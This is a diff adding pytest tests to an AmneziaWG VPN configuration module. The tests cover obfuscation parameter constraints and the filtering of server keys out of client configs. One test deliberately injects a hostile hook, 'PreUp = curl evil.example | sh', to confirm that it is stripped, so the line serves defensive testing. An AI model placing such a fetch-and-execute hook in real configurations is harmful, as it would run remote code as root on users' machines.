@@ -17,6 +17,7 @@ from infrastructure.vpn.awg_config import (
     parse_latest_handshakes,
     pick_free_address,
     public_key_from_private,
+    random_obfuscation,
     remove_peer,
     render_awg_config,
     render_client_config,
@@ -190,3 +191,55 @@ def test_parse_latest_handshakes() -> None:
     assert handshakes["keyA="] == datetime.fromtimestamp(1700000000, tz=timezone.utc)
     assert handshakes["keyB="] is None  # 0 — рукопожатий не было
     assert "keyC=" not in handshakes
+
+
+def test_random_obfuscation_respects_amneziawg_constraints() -> None:
+    for _ in range(1000):
+        o = random_obfuscation()
+        assert 148 + o.s1 != 92 + o.s2  # init и response не совпадают по размеру
+        headers = {o.h1, o.h2, o.h3, o.h4}
+        assert len(headers) == 4 and not headers & {1, 2, 3, 4}  # не заголовки обычного WireGuard
+        assert 0 < o.jmin < o.jmax <= 1280 and o.jc >= 1
+
+
+def test_each_install_gets_own_obfuscation_and_client_copies_it() -> None:
+    first = interface_values(render_awg_config(generate_secret_keys().private_key, 31000))
+    second = interface_values(render_awg_config(generate_secret_keys().private_key, 31000))
+    assert [first[k] for k in ("H1", "H2", "H3", "H4")] != [second[k] for k in ("H1", "H2", "H3", "H4")]
+    client = interface_values(_client_for(render_awg_config(generate_secret_keys().private_key, 31000)))
+    assert {k for k in client if k.startswith(("H", "S", "J"))} == {
+        "H1",
+        "H2",
+        "H3",
+        "H4",
+        "S1",
+        "S2",
+        "S3",
+        "S4",
+        "Jc",
+        "Jmin",
+        "Jmax",
+    }
+
+
+def test_client_config_gets_only_allowlisted_server_keys(server_config: str) -> None:
+    """Хуки и прочие ключи серверного [Interface] к клиенту не попадают: wg-quick выполнил бы их у клиента от root."""
+    tampered = server_config.replace(
+        "[Interface]\n", "[Interface]\nPreUp = curl evil.example | sh\nTable = off\nSaveConfig = true\nMTU = 1280\n", 1
+    )
+    client = _client_for(tampered)
+    for key in ("PreUp", "Table", "SaveConfig", "MTU", "PostUp", "PostDown", "ListenPort"):
+        assert f"{key} =" not in client
+    assert "Jc =" in client and "H1 =" in client  # обфускация — на месте
+
+
+def _client_for(server_text: str) -> str:
+    keys = generate_secret_keys()
+    return render_client_config(
+        server_config=server_text,
+        client_private_key=keys.private_key,
+        client_address=ipaddress.IPv4Address("10.8.1.2"),
+        psk=keys.psk,
+        server_public_key=keys.public_key,
+        endpoint_host="203.0.113.10",
+    )
